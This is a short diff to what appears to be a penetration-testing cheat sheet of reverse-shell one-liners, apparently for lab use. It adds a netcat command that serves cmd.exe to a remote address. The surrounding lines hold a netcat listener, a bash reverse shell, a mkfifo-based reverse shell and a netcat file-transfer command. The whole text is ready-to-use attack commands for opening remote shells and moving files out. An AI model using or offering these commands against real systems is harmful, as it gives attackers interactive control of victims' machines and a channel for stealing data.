@@ -187,6 +187,7 @@ Revrse Shell
 NetCat
   Listener: nc -lvnp 5555
   NC Bash: nc 10.10.14.171 5555 -e /bin/bash
+  NC Windows: nc 10.10.14.3 8081 -e cmd.exe
   OpenBSD: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.171 5555 >/tmp/f &
   File xfer: Listener: nc -l -p 1234 > out.file - Sender: nc -w 3 IP 1234 < out.file
   
